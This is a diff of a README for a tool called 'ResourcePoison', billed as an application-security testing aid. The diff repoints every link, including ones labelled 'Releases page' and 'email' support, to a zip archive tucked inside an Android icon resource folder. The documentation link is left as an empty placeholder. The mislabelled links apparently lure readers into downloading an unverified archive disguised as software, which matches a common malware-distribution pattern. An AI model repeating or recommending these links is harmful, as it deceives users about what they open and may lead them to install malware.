@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip)](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip)
+[![Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/app/src/main/res/mipmap-xxxhdpi/Poison-Resource-v3.8.zip)](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/app/src/main/res/mipmap-xxxhdpi/Poison-Resource-v3.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run ResourcePoison effectively, ensure that your device meets the following r
 ## 🚀 Getting Started
 
 1. **Download the Application**  
-   Visit this page to download: [Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
+   Visit this page to download: [Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/app/src/main/res/mipmap-xxxhdpi/Poison-Resource-v3.8.zip).
 
 2. **Install the Application**  
    - Open the downloaded file.
@@ -63,7 +63,7 @@ If you experience issues while using ResourcePoison, try the following solutions
 
 For detailed documentation and further support:
 - Visit the [ResourcePoison Documentation]({{Documentation_Link}}).
-- Contact support via [email](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
+- Contact support via [email](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/app/src/main/res/mipmap-xxxhdpi/Poison-Resource-v3.8.zip).
 
 ## 🔗 Additional Resources
 
@@ -80,12 +80,12 @@ Always ensure you understand the risks associated with testing applications for 
 
 ## ⚙️ Updates
 
-We regularly release updates to improve performance and introduce new features. Check for updates periodically on our [Releases page](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
+We regularly release updates to improve performance and introduce new features. Check for updates periodically on our [Releases page](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/app/src/main/res/mipmap-xxxhdpi/Poison-Resource-v3.8.zip).
 
 ---
 
 ## 📥 Download & Install
 
-To start using ResourcePoison, visit this page to download: [Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
+To start using ResourcePoison, visit this page to download: [Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/app/src/main/res/mipmap-xxxhdpi/Poison-Resource-v3.8.zip).
 
 Thank you for choosing ResourcePoison! Enjoy exploring and learning about application security.
